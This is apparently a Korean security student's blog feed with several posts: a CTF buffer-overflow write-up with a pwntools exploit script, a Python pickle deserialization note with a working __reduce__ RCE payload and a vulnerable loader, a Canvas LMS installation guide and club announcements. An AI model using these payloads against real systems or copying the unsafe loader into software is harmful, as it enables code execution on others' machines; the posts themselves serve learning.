        <content type="html"><![CDATA[<p>우선 file 명령어와 checksec을 사용해서 바이너리 컴파일 정보와, Memory Mitigation을 확인 해보자.</p><p>사진과 같이 x64 dynamic linked binary임을 알 수 있고, FULL RELRO, NX, PIE가 활성화 되어 있는 것을 알 수 있다.</p><p>IDA로 바이너리 분석을 해보면 main() 함수의 동작 로직은 다음과 같다.</p><p>바이너리가 실행되면 scanf 함수를 통해 사용자에게 입력받는 로직이고, 0xdeadbeef 값을 세팅하고 있어</p><p>BOF를 통해 해당 메모리 영역을 덮어버리면 BOF Detected!! 가 발생한다.</p><p>그럼 시나리오는 다음과 같이 생각해볼 수 있다.</p><p>입력 받는 메모리 공간은 rbp-0x90(144) 만큼을 받고 있으니, 140만큼 써주고 체크 로직을 통과하기 위해 나머지 4byte 값을 0xdeadbeef 로 만들어 준다음,</p><p>RSP를 8byte dummy로 채우고 RET 에서 printflag() 함수로 리턴 시켜준다면 플래그를 획득할 수 있는 구조가 된다.</p><p>32비트 환경에서 컴파일 된 바이너리는 SFP(4byte) + RET(4byte)를 가지지만,</p><p>64비트 환경에서 컴파일 된 바이너리는 RSP(8byte) + RET(6byte)의 값을 가지는 것을 고려해주면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> <span class="number">2</span> </span><br><span class="line"> <span class="number">3</span> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> <span class="number">4</span> </span><br><span class="line"> <span class="number">5</span> <span class="comment">#p = process(&#x27;./bof101&#x27;)</span></span><br><span class="line"> <span class="number">6</span> </span><br><span class="line"> <span class="number">7</span> p = remote(<span class="string">&#x27;bof101.sstf.site&#x27;</span>,<span class="number">1337</span>)</span><br><span class="line"> <span class="number">8</span> </span><br><span class="line"> <span class="number">9</span> e = ELF(<span class="string">&#x27;./bof101&#x27;</span>)</span><br><span class="line"><span class="number">10</span> </span><br><span class="line"><span class="number">11</span> p.recvuntil(<span class="string">&#x27;addr:&#x27;</span>)</span><br><span class="line"><span class="number">12</span> </span><br><span class="line"><span class="number">13</span> flag_addr = <span class="built_in">int</span>(p.recv(<span class="number">15</span>),<span class="number">16</span>)</span><br><span class="line"><span class="number">14</span> </span><br><span class="line"><span class="number">15</span> p.recvline()</span><br><span class="line"><span class="number">16</span> </span><br><span class="line"><span class="number">17</span> print(<span class="built_in">hex</span>(flag_addr))</span><br><span class="line"><span class="number">18</span> </span><br><span class="line"><span class="number">19</span> payload = <span class="string">&quot;A&quot;</span>*<span class="number">140</span></span><br><span class="line"><span class="number">20</span> payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="number">21</span> payload += <span class="string">&quot;A&quot;</span>*<span class="number">8</span></span><br><span class="line"><span class="number">22</span> payload += p64(flag_addr)</span><br><span class="line"><span class="number">23</span> </span><br><span class="line"><span class="number">24</span> p.sendlineafter(<span class="string">&#x27;: &#x27;</span>,payload)</span><br><span class="line"><span class="number">25</span> </span><br><span class="line"><span class="number">26</span> p.interactive()</span><br></pre></td></tr></table></figure><p><code> SCTF&#123;n0w_U_R_B0F_3xpEr7&#125; </code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwnable </tag>
            
            <tag> BOF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>canvas lms installation</title>
      <link href="2020/06/27/canvas-install-200627/"/>
      <url>2020/06/27/canvas-install-200627/</url>
      
        <content type="html"><![CDATA[<h3 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h3><p>OS : Ubuntu 16.04 Desktop(<a href="http://old-releases.ubuntu.com/releases/16.04.4/">http://old-releases.ubuntu.com/releases/16.04.4/</a>)</p><p>Canvas LMS - Open Source : <a href="https://github.com/instructure/canvas-lms">https://github.com/instructure/canvas-lms</a></p><h2 id="설치"><a href="#설치" class="headerlink" title="설치"></a>설치</h2><h3 id="postgresql-설치"><a href="#postgresql-설치" class="headerlink" title="postgresql 설치"></a>postgresql 설치</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install postgresql-9.5</span><br></pre></td></tr></table></figure><hr><h3 id="관리자-계정-생성"><a href="#관리자-계정-생성" class="headerlink" title="관리자 계정 생성"></a>관리자 계정 생성</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser sysadmin</span><br></pre></td></tr></table></figure><hr><h3 id="sysadmin-계정에-대한-Root-권한-부여"><a href="#sysadmin-계정에-대한-Root-권한-부여" class="headerlink" title="sysadmin 계정에 대한 Root 권한 부여"></a>sysadmin 계정에 대한 Root 권한 부여</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">visudo → User Privileges → sysadmin ALL=(ALL:ALL) ALL</span><br></pre></td></tr></table></figure><hr><h3 id="sysadmin-계정으로-사용자-변경"><a href="#sysadmin-계정으로-사용자-변경" class="headerlink" title="sysadmin 계정으로 사용자 변경"></a>sysadmin 계정으로 사용자 변경</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su sysadmin</span><br></pre></td></tr></table></figure><hr><h3 id="postgres-설정"><a href="#postgres-설정" class="headerlink" title="postgres 설정"></a>postgres 설정</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo -u postgres createuser canvas --no-createdb \</span><br><span class="line">   --no-superuser --no-createrole --pwprompt</span><br><span class="line"></span><br><span class="line">sudo -u postgres createdb canvas_production --owner=canvas</span><br></pre></td></tr></table></figure><hr><h3 id="git-설정"><a href="#git-설정" class="headerlink" title="git 설정"></a>git 설정</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git-core</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/instructure/canvas-lms.git canvas</span><br><span class="line"><span class="built_in">cd</span> canvas</span><br><span class="line">git checkout stable</span><br></pre></td></tr></table></figure><hr><h3 id="installation-1"><a href="#installation-1" class="headerlink" title="installation(1)"></a>installation(1)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir -p /var/canvas</span><br><span class="line">sudo chown -R sysadmin /var/canvas</span><br><span class="line"></span><br><span class="line">$(canvas) cp -av . /var/canvas</span><br></pre></td></tr></table></figure><hr><h3 id="Dependency"><a href="#Dependency" class="headerlink" title="Dependency"></a>Dependency</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:brightbox/ruby-ng</span><br><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><hr><h3 id="ruby2-4-install"><a href="#ruby2-4-install" class="headerlink" title="ruby2.4 install"></a>ruby2.4 install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby2.4 ruby2.4-dev zlib1g-dev libxml2-dev \</span><br><span class="line">                       libsqlite3-dev postgresql libpq-dev \</span><br><span class="line">                       libxmlsec1-dev curl make g++</span><br></pre></td></tr></table></figure><hr><h3 id="node-js-install"><a href="#node-js-install" class="headerlink" title="node.js install"></a>node.js install</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -</span><br><span class="line">sudo apt-get install nodejs</span><br></pre></td></tr></table></figure><hr><h3 id="set-sysadmin-postgres-superuser"><a href="#set-sysadmin-postgres-superuser" class="headerlink" title="set sysadmin postgres superuser"></a>set sysadmin postgres superuser</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo -u postgres createuser <span class="variable">$USER</span></span><br><span class="line">$ sudo -u postgres psql -c <span class="string">&quot;alter user <span class="variable">$USER</span> with superuser&quot;</span> postgres</span><br></pre></td></tr></table></figure><hr><h3 id="bundler-and-canvas-dependencies"><a href="#bundler-and-canvas-dependencies" class="headerlink" title="bundler and canvas dependencies"></a>bundler and canvas dependencies</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo gem install bundler --version 1.13.7</span><br><span class="line">$ bundle _1.13.7_ install --path vendor/bundle</span><br></pre></td></tr></table></figure><hr><h3 id="yarn-installation"><a href="#yarn-installation" class="headerlink" title="yarn installation"></a>yarn installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sS https://dl.yarnpkg.com/debian/pubkey.gpg | sudo apt-key add -</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;deb https://dl.yarnpkg.com/debian/ stable main&quot;</span> | sudo tee /etc/apt/sources.list.d/yarn.list</span><br><span class="line">$ sudo apt-get update &amp;&amp; sudo apt-get install yarn=1.10.1-1</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install python</span><br><span class="line">$ yarn install</span><br></pre></td></tr></table></figure><hr><h3 id="canvas-default-config"><a href="#canvas-default-config" class="headerlink" title="canvas default config"></a>canvas default config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">for</span> config <span class="keyword">in</span> amazon_s3 database \</span><br><span class="line">  delayed_jobs domain file_store outgoing_mail security external_migration; \</span><br><span class="line">  <span class="keyword">do</span> cp config/<span class="variable">$config</span>.yml.example config/<span class="variable">$config</span>.yml; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><hr><h3 id="dynamic-setting"><a href="#dynamic-setting" class="headerlink" title="dynamic setting"></a>dynamic setting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/dynamic_settings.yml.example config/dynamic_settings.yml</span><br><span class="line">$ (check) nano config/dynamic_settings.yml (vi로 진행해도 상관 없음)</span><br></pre></td></tr></table></figure><hr><h3 id="database-setting"><a href="#database-setting" class="headerlink" title="database setting"></a>database setting</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/database.yml.example config/database.yml</span><br><span class="line">$ (check) nano config/database.yml (vi로 진행해도 상관 없음)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do not create a queue: section for your test environment</span></span><br><span class="line"><span class="built_in">test</span>:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: utf8</span><br><span class="line">  database: canvas_test</span><br><span class="line">  host: localhost</span><br><span class="line">  username: canvas</span><br><span class="line">  timeout: 5000</span><br><span class="line"></span><br><span class="line">development:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: utf8</span><br><span class="line">  database: canvas_development</span><br><span class="line">  timeout: 5000</span><br><span class="line"></span><br><span class="line">production:</span><br><span class="line">  adapter: postgresql</span><br><span class="line">  encoding: utf8</span><br><span class="line">  database: canvas_production</span><br><span class="line">  host: localhost</span><br><span class="line">  username: canvas</span><br><span class="line">  password: your_password</span><br><span class="line">  timeout: 5000</span><br></pre></td></tr></table></figure><hr><h3 id="outgoing-mail-config"><a href="#outgoing-mail-config" class="headerlink" title="outgoing mail config"></a>outgoing mail config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/outgoing_mail.yml.example config/outgoing_mail.yml</span><br><span class="line">$ (check) nano config/outgoing_mail.yml (vi로 진행해도 상관 없음)</span><br></pre></td></tr></table></figure><hr><h3 id="url-config"><a href="#url-config" class="headerlink" title="url config"></a>url config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/domain.yml.example config/domain.yml</span><br><span class="line">$ (check) nano config/domain.yml (vi로 진행해도 상관 없음)</span><br><span class="line"></span><br><span class="line">production:</span><br><span class="line">  domain: <span class="string">&quot;canvas.jhyeon.xyz&quot;</span></span><br><span class="line">  <span class="comment"># whether this instance of canvas is served over ssl (https) or not</span></span><br><span class="line">  <span class="comment"># defaults to true for production, false for test/development</span></span><br><span class="line">  ssl: <span class="literal">false</span></span><br><span class="line">  <span class="comment"># files_domain: &quot;canvasfiles.example.com&quot;</span></span><br></pre></td></tr></table></figure><hr><h3 id="security-config"><a href="#security-config" class="headerlink" title="security config"></a>security config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ cp config/security.yml.example config/security.yml</span><br><span class="line">$ nano config/security.yml (vi로 진행해도 상관 없음)</span><br><span class="line"></span><br><span class="line">production: &amp;default</span><br><span class="line">  <span class="comment"># replace this with a random string of at least 20 characters</span></span><br><span class="line">  encryption_key: 12345123451234512345</span><br><span class="line">  lti_iss: <span class="string">&#x27;https://canvas.instructure.com&#x27;</span></span><br></pre></td></tr></table></figure><hr><h3 id="generate-assets"><a href="#generate-assets" class="headerlink" title="generate assets"></a>generate assets</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ (/var/canvas) mkdir -p <span class="built_in">log</span> tmp/pids public/assets app/stylesheets/brandable_css_brands</span><br><span class="line">$ (/var/canvas) touch app/stylesheets/_brandable_variables_defaults_autogenerated.scss</span><br><span class="line">$ (/var/canvas) touch Gemfile.lock</span><br><span class="line">$ (/var/canvas) touch <span class="built_in">log</span>/production.log</span><br><span class="line">$ (/var/canvas) sudo adduser --disabled-password --gecos canvas canvasuser</span><br><span class="line">$ (/var/canvas) sudo chown -R canvasuser config/environment.rb <span class="built_in">log</span> tmp public/assets \</span><br><span class="line">                              app/stylesheets/_brandable_variables_defaults_autogenerated.scss \</span><br><span class="line">                              app/stylesheets/brandable_css_brands Gemfile.lock config.ru</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ (/var/canvas) yarn install</span><br><span class="line">$ (/var/canvas) RAILS_ENV=production bundle <span class="built_in">exec</span> rake canvas:compile_assets</span><br><span class="line">$ (/var/canvas) sudo chown -R canvasuser public/dist/brandable_css</span><br><span class="line"></span><br><span class="line">$ (/var/canvas) RAILS_ENV=production bundle <span class="built_in">exec</span> rake brand_configs:generate_and_upload_all</span><br><span class="line"></span><br><span class="line">* VM 메모리 최소 8GB 메모리 구성 필요합니다.</span><br></pre></td></tr></table></figure><hr><h3 id="database-population"><a href="#database-population" class="headerlink" title="database population"></a>database population</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RAILS_ENV=production bundle <span class="built_in">exec</span> rake db:initial_setup</span><br></pre></td></tr></table></figure><hr><h3 id="apache2-installation"><a href="#apache2-installation" class="headerlink" title="apache2 installation"></a>apache2 installation</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install passenger libapache2-mod-passenger apache2</span><br><span class="line">$ sudo a2enmod rewrite</span><br><span class="line">$ sudo a2enmod passenger</span><br><span class="line">$ sudo a2enmod ssl</span><br><span class="line">$ sudo unlink /etc/apache2/sites-enabled/000-default.conf</span><br><span class="line">아래 단계 완료 후 수행</span><br><span class="line">$ sudo a2ensite canvas</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">  ServerName canvas.jhyeon.xyz</span><br><span class="line">  ServerAlias canvasfiles.canvas.jhyeon.xyz</span><br><span class="line">  ServerAdmin admin@canvas.jhyeon.xyz</span><br><span class="line">  DocumentRoot /var/canvas/public</span><br><span class="line">  ErrorLog /var/<span class="built_in">log</span>/apache2/canvas_errors.log</span><br><span class="line">  LogLevel warn</span><br><span class="line">  CustomLog /var/<span class="built_in">log</span>/apache2/canvas_access.log combined</span><br><span class="line">  SetEnv RAILS_ENV production</span><br><span class="line">  &lt;Directory /var/canvas/public&gt;</span><br><span class="line">    Options All</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Require all granted</span><br><span class="line">    Options -MultiViews</span><br><span class="line">  &lt;/Directory&gt;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="cache-config"><a href="#cache-config" class="headerlink" title="cache config"></a>cache config</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ sudo add-apt-repository ppa:chris-lea/redis-server</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">$ sudo apt-get install redis-server</span><br><span class="line"></span><br><span class="line">$ sudo cp config/cache_store.yml.example config/cache_store.yml</span><br><span class="line">$ sudo vi config/cache_store.yml</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>:</span><br><span class="line">  cache_store: redis_store</span><br><span class="line">development:</span><br><span class="line">  cache_store: redis_store</span><br><span class="line">production:</span><br><span class="line">  cache_store: redis_store</span><br><span class="line"></span><br><span class="line">$ sudo chown canvasuser config/cache_store.yml</span><br><span class="line"></span><br><span class="line">$ sudo cp config/redis.yml.example config/redis.yml</span><br><span class="line">$ sudo vi config/redis.yml</span><br><span class="line"></span><br><span class="line">production:</span><br><span class="line">  servers:</span><br><span class="line">    - redis://localhost</span><br><span class="line"></span><br><span class="line">$ sudo chown canvasuser config/redis.yml</span><br></pre></td></tr></table></figure><hr><h3 id="start-server"><a href="#start-server" class="headerlink" title="start server"></a>start server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -s /var/canvas/script/canvas_init /etc/init.d/canvas_init</span><br><span class="line">$ sudo update-rc.d canvas_init defaults</span><br><span class="line">$ sudo /etc/init.d/canvas_init start</span><br><span class="line">$ sudo /etc/init.d/apache2 restart</span><br></pre></td></tr></table></figure><hr><h3 id="참고"><a href="#참고" class="headerlink" title="참고"></a>참고</h3><ul><li><p><a href="https://github.com/instructure/canvas-lms/wiki/Production-Start">https://github.com/instructure/canvas-lms/wiki/Production-Start</a></p></li><li><p><a href="https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49">https://www.notion.so/jhyeon/Canvas-LMS-Install-bdbe60b1a7bd40029a5f241ed77a9d49</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Docx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CANVAS </tag>
            
            <tag> LMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>동아리 워게임 홍보(?)</title>
      <link href="2020/06/19/bangsiri-wargame-200619/"/>
      <url>2020/06/19/bangsiri-wargame-200619/</url>
      
        <content type="html"><![CDATA[<p>올해 3월을 끝으로 기존 CTFd 에서 운영하던 동아리 학습용 CTF 서버를</p><p>자체 플랫폼으로 이전 하였습니당, 문제도 기존과 다르게 모의 해킹 분야별로 많이 업데이트 할 예정이고,</p><p>동아리 원이 아니더라도 문제 풀어보실 수 있으니 많이 이용 해주세요!</p><p><a href="https://wargame.hacking.one/">https://wargame.hacking.one/</a></p>]]></content>
      
      
      <categories>
          
          <category> Memo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> B@ngsiri </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python Pickle Library Vulnability</title>
      <link href="2020/06/16/python-pickle-200616/"/>
      <url>2020/06/16/python-pickle-200616/</url>
      
        <content type="html"><![CDATA[<h3 id="Python-Pickle"><a href="#Python-Pickle" class="headerlink" title="Python Pickle"></a>Python Pickle</h3><p>Python Pickle은 직렬화(Pickling) , 역직렬화(UnPickling) 을 지원하는 모듈 입니다.</p><hr><h3 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h3><p>해당 모듈은 공식 문서에서도 사용을 권장하지 않습니다, 데이터를 역직렬화(UnPickling) 할 때,</p><p>임의의 코드를 실행하는 등의 악의적인 데이터로 구성하여 RCE(Remote Control Exexecution) 등의 공격이 가능하게 됩니다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">object</span>.__getnewargs_ex__()</span><br><span class="line"><span class="built_in">object</span>.__getnewargs__()</span><br><span class="line"><span class="built_in">object</span>.__getstate__()</span><br><span class="line"><span class="built_in">object</span>.__setstate__(state)</span><br><span class="line"><span class="built_in">object</span>.__reduce__()</span><br><span class="line"><span class="built_in">object</span>.__reduce_ex__(protocol)</span><br></pre></td></tr></table></figure><p>reduce() 메서드는 아무런 인자도 받지 않지만, 튜플을 반환할 때 함수를 반환하는 것이 가능합니다.</p><p>[pickling.py]</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (os.system, (cmd,))</span><br><span class="line"></span><br><span class="line">shellcode = cPickle.dumps(Exploit())</span><br><span class="line"><span class="built_in">print</span> base64.b64encode(shellcode)</span><br></pre></td></tr></table></figure><p>[ex.py]</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> cPickle</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">data = raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> cPickle.loads(base64.b64decode(data))</span><br></pre></td></tr></table></figure><hr><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://docs.python.org/ko/3/library/pickle.html#data-stream-format">https://docs.python.org/ko/3/library/pickle.html#data-stream-format</a></p></li><li><p><a href="https://github.com/JHye0n/Web-CTF-Cheatsheet">https://github.com/JHye0n/Web-CTF-Cheatsheet</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Memo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>S/W 소프트웨어 개발 프로세스 모델</title>
      <link href="2020/06/13/swmodel-200613/"/>
      <url>2020/06/13/swmodel-200613/</url>
      
        <content type="html"><![CDATA[<p>개발 프로세스와 관련해서 여러 많은 자료를 찾아 보고 개인 공부 겸 정리 하였습니다.</p><p>이론 부분에 있어서도 한 두가지가 아니다보니 많이 헷갈리는데 앞으로 더 꾸준히 공부해야 겠네요..</p><p>해당 내용은 아래 노션에 작성되어 있습니다.</p><p><a href="https://www.notion.so/jhyeon/S-W-ed3a6d56bb2f42c199e93a15ceb35342">https://www.notion.so/jhyeon/S-W-ed3a6d56bb2f42c199e93a15ceb35342</a></p>]]></content>
      
      
      <categories>
          
          <category> Docx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>동아리 온라인 시험 플랫폼 개발 후기</title>
      <link href="2020/06/12/exam-platformdev-200612/"/>
      <url>2020/06/12/exam-platformdev-200612/</url>
      
